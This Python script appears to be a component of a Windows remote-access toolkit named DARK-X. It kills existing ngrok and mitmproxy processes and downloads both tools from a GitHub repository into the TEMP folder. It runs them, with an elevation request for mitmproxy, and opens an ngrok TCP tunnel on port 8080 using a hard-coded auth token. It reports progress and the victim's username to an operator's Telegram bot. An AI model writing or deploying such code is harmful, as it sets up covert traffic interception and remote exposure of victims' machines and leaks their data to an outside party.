from zipfile import ZipFile
import requests
import os
import sys
import getpass
from subprocess import Popen
import win32com.shell.shell as  shell
mitmf = ""
class MITMProxy():
	def __init__(self):
		self.token = sys.argv[1]
		self.chat_id= sys.argv[2]
		self.ngrok = "https://raw.githubusercontent.com/UQABXO/DARK-X/main/bin/ngrok-stable-windows-386.zip"
		self.mitmfproxy = "https://raw.githubusercontent.com/UQABXO/DARK-X/main/bin/mitmfproxy.zip"
		self.Main()

	def Main(self):
		os.system('taskkill /IM ngrok.exe /F')
		os.system('taskkill /IM mitmproxy.exe /F')
		#self.MITM_Proxy()
		self.Ngrok()
	def Ngrok(self):
		self.SendMessage(" Donwloading Ngrok...")
		req = requests.get(self.ngrok)
		
		filename = os.environ['TEMP'] + "\\ngrok.zip"
		file = open(filename, "wb")
		file.write(req.content)
		file.close()
	
		with ZipFile(filename, 'r') as zip_ref:
			zip_ref.extractall(os.environ['TEMP'])
		Popen([os.environ['TEMP'] + "\\ngrok.exe","authtoken","27D5cTLjSznClCfArRRGjs2os83_6Ps5YmFqGTfUVZgvnR7e1"])
		shell.ShellExecuteEx(lpFile=os.environ['TEMP'] + "\\ngrok.exe", lpParameters="tcp 8080")
		self.SendMessage(" Ngrok Executed.")

	def MITM_Proxy(self):
		print(111111)
		self.SendMessage(" Donwloading MITMF...")
		req = requests.get(self.mitmfproxy)
		
		filename = os.environ['TEMP'] + "\\mitmfproxy.zip"
		file = open(filename, "wb")
		file.write(req.content)
		file.close()
		with ZipFile(filename, 'r') as zip_ref:
			zip_ref.extractall(os.environ['TEMP'])
		self.SendMessage(" MITMProxy Executed.")
		shell.ShellExecuteEx(lpVerb='runas', lpFile=os.environ['TEMP']+"\\mitmfproxy\\mitmproxy.exe")
		#self.SendMessage(" Reverse Proxy Ready.")
	def SendMessage(self,message):
		self.Request("https://api.telegram.org/bot" + self.token + "/sendMessage?text=" + message + "\n--" + getpass.getuser() + "--&chat_id=" + self.chat_id)

	def Request(self,url):
		return requests.get(url).text.encode("utf-8")
MITMProxy()
